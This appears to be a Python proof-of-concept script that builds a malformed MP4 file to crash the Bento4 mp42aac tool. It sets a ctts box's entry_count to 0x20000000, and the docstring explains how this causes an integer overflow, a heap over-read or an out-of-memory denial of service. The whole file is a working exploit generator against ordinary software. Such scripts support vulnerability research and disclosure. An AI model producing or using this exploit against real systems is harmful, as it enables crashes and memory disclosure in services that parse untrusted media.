#!/usr/bin/env python3
"""
VULN 002 PoC generator: ctts atom integer overflow (entry_count*8 wraps to 0)
leading to heap buffer over-read / OOM DoS in Bento4 mp42aac.

Constructs a minimal but structurally valid MP4 whose ctts box carries
entry_count = 0x20000000.  When parsed:
  - m_Entries.SetItemCount(0x20000000) attempts to allocate ~4 GB -> std::bad_alloc
  - new unsigned char[0x20000000 * 8] overflows uint32 to 0 -> zero-byte alloc,
    then the loop reads entry_count*8 bytes OOB.
Either path produces a crash / DoS.
"""

import struct
import os

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def box(type4: str, data: bytes = b'') -> bytes:
    """Simple atom: 4-byte BE size + 4-byte type + payload."""
    return struct.pack('>I', 8 + len(data)) + type4.encode('latin-1') + data


def full_box(type4: str, version: int, flags: int, data: bytes = b'') -> bytes:
    """Full atom (FullBox): box header + version(1B) + flags(3B) + payload."""
    vh = struct.pack('>B', version) + flags.to_bytes(3, 'big')
    return box(type4, vh + data)


# ---------------------------------------------------------------------------
# ftyp
# ---------------------------------------------------------------------------

ftyp = box('ftyp',
           b'mp42'                       # major brand
           + struct.pack('>I', 0)        # minor version
           + b'mp42'                     # compatible brand
           )

# ---------------------------------------------------------------------------
# ctts  -- MALICIOUS: entry_count = 0x20000000, no actual entry data
# ---------------------------------------------------------------------------

EVIL_COUNT = 0x20000000
ctts_payload = struct.pack('>I', EVIL_COUNT)   # entry_count field only; no entries follow
ctts = full_box('ctts', 0, 0, ctts_payload)    # 8(hdr)+4(ver/flags)+4(count) = 16 bytes

# ---------------------------------------------------------------------------
# stts  (minimal, zero entries)
# ---------------------------------------------------------------------------

stts = full_box('stts', 0, 0, struct.pack('>I', 0))

# ---------------------------------------------------------------------------
# stsd  (minimal, zero entries)
# ---------------------------------------------------------------------------

stsd = full_box('stsd', 0, 0, struct.pack('>I', 0))

# ---------------------------------------------------------------------------
# stbl  = stsd + stts + ctts
# ---------------------------------------------------------------------------

stbl = box('stbl', stsd + stts + ctts)

# ---------------------------------------------------------------------------
# dinf / dref
# ---------------------------------------------------------------------------

url_entry = full_box('url ', 0, 1)          # self-contained; no extra data
dref = full_box('dref', 0, 0,
                struct.pack('>I', 1) + url_entry)   # entry_count = 1
dinf = box('dinf', dref)

# ---------------------------------------------------------------------------
# smhd (sound media header)
# ---------------------------------------------------------------------------

smhd = full_box('smhd', 0, 0, struct.pack('>HH', 0, 0))   # balance + reserved

# ---------------------------------------------------------------------------
# minf = smhd + dinf + stbl
# ---------------------------------------------------------------------------

minf = box('minf', smhd + dinf + stbl)

# ---------------------------------------------------------------------------
# mdhd (version 0)
# creation_time, modification_time, timescale, duration, language+pre_defined
# ---------------------------------------------------------------------------

mdhd_payload = struct.pack('>IIIII',
                            0,      # creation_time
                            0,      # modification_time
                            44100,  # timescale
                            0,      # duration
                            0x55c4_0000,  # language='und' packed + pre_defined
                            )
mdhd = full_box('mdhd', 0, 0, mdhd_payload)

# ---------------------------------------------------------------------------
# hdlr
# ---------------------------------------------------------------------------

hdlr_payload = (struct.pack('>I', 0)   # pre_defined
                + b'soun'              # handler_type
                + struct.pack('>III', 0, 0, 0)   # reserved
                + b'SoundHandler\x00')
hdlr = full_box('hdlr', 0, 0, hdlr_payload)

# ---------------------------------------------------------------------------
# mdia = mdhd + hdlr + minf
# ---------------------------------------------------------------------------

mdia = box('mdia', mdhd + hdlr + minf)

# ---------------------------------------------------------------------------
# tkhd (version 0)
# ---------------------------------------------------------------------------

MATRIX_IDENTITY = struct.pack('>9i',
                               0x0001_0000, 0, 0,
                               0, 0x0001_0000, 0,
                               0, 0, 0x4000_0000)
tkhd_payload = (struct.pack('>II', 0, 0)          # creation_time, modification_time
                + struct.pack('>I', 1)             # track_id
                + struct.pack('>I', 0)             # reserved
                + struct.pack('>I', 0)             # duration
                + struct.pack('>II', 0, 0)         # reserved
                + struct.pack('>HH', 0, 0)         # layer, alternate_group
                + struct.pack('>HH', 0x0100, 0)    # volume, reserved
                + MATRIX_IDENTITY
                + struct.pack('>II', 0, 0)         # width, height
                )
tkhd = full_box('tkhd', 0, 0, tkhd_payload)

# ---------------------------------------------------------------------------
# trak = tkhd + mdia
# ---------------------------------------------------------------------------

trak = box('trak', tkhd + mdia)

# ---------------------------------------------------------------------------
# mvhd (version 0)
# ---------------------------------------------------------------------------

mvhd_payload = (struct.pack('>II', 0, 0)          # creation_time, modification_time
                + struct.pack('>I', 1000)          # timescale
                + struct.pack('>I', 0)             # duration
                + struct.pack('>I', 0x0001_0000)   # rate (1.0)
                + struct.pack('>H', 0x0100)        # volume (1.0)
                + b'\x00' * 10                     # reserved
                + MATRIX_IDENTITY
                + b'\x00' * 24                     # pre_defined
                + struct.pack('>I', 2)             # next_track_id
                )
mvhd = full_box('mvhd', 0, 0, mvhd_payload)

# ---------------------------------------------------------------------------
# moov = mvhd + trak
# ---------------------------------------------------------------------------

moov = box('moov', mvhd + trak)

# ---------------------------------------------------------------------------
# assemble and write
# ---------------------------------------------------------------------------

mp4_bytes = ftyp + moov

out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_002.mp4')
with open(out_path, 'wb') as f:
    f.write(mp4_bytes)

print(f"[+] Written {len(mp4_bytes)} bytes -> {out_path}")
print(f"[+] ctts entry_count = 0x{EVIL_COUNT:08X} ({EVIL_COUNT})")
print(f"[+] Integer overflow: {EVIL_COUNT} * 8 = 0x{(EVIL_COUNT * 8) & 0xFFFFFFFF:08X} (wraps to 0 in uint32)")
